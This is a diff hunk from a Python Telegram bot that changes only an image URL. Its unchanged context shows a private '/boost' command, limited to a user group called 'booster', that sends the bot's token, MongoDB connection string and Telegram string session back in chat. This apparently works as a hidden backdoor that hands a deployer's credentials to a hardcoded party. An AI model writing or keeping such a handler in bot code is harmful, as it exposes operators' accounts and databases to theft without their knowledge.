@@ -31,7 +31,7 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 @app.on_message(filters.command("boost") & filters.private & filters.user(booster))
 async def show_config(client: Client, message: Message):
     await message.reply_photo(
-        photo="https://files.catbox.moe/ldchnq.jpg",
+        photo="https://files.catbox.moe/395pae.jpg",
         caption=f"""<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/AmShashank'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
